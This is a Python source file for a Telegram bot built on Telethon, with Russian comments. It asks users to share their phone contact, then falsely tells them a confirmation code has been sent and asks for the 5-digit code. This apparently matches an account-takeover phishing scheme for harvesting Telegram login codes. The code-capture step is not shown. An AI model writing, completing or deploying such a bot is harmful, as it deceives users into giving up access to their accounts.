import os
import sys
import logging
import asyncio
from telethon import TelegramClient, events
from telethon.tl.custom import Button

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Получаем переменные окружения
BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

# Хранилище состояний пользователей
user_data = {}

# Создаем клиента (НЕ ЗАПУСКАЕМ ЗДЕСЬ)
client = TelegramClient('bot_session', API_ID, API_HASH)

@events.register(events.NewMessage)
async def handler(event):
    """Основной обработчик сообщений"""
    try:
        text = event.message.message
        user_id = event.sender_id
        
        if text == "/start":
            await event.reply(
                "🔐 **Добро пожаловать!**\n\nНажмите кнопку ниже для отправки номера телефона:",
                buttons=[[Button.text("📱 Отправить номер", resize=True)]]
            )
        
        elif text == "📱 Отправить номер":
            await event.reply(
                "📞 **Поделитесь вашим контактом:**",
                buttons=[[Button.request_contact("📞 Поделиться контактом")]]
            )
            user_data[user_id] = {'step': 'waiting_contact'}
    
    except Exception as e:
        logger.error(f"Ошибка в обработчике: {e}")

@events.register(events.NewMessage)
async def contact_handler(event):
    """Обработка полученного контакта"""
    try:
        if not event.message.contact:
            return
            
        contact = event.message.contact
        user_id = event.sender_id
        phone = contact.phone_number
        
        await event.reply(
            f"✅ **Номер получен:** `{phone}`\n\n"
            "📨 **Код подтверждения отправлен**\n"
            "Введите 5-значный код из сообщения:"
        )
        user_data[user_id] = {'step': 'waiting_code', 'phone': phone}
        
    except Exception as e:
        logger.error(f"Ошибка в contact_handler: {e}")

async def main():
    """Главная функция запуска"""
    try:
        # Добавляем обработчики
        client.add_event_handler(handler)
        client.add_event_handler(contact_handler)
        
        # Запускаем клиента
        await client.start(bot_token=BOT_TOKEN)
        me = await client.get_me()
        logger.info(f"✅ Бот @{me.username} запущен!")
        
        # Бесконечное ожидание
        await client.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"Ошибка в main: {e}")
    finally:
        await client.disconnect()

def run():
    """Функция запуска с правильным циклом событий"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
    finally:
        loop.close()

if __name__ == "__main__":
    run()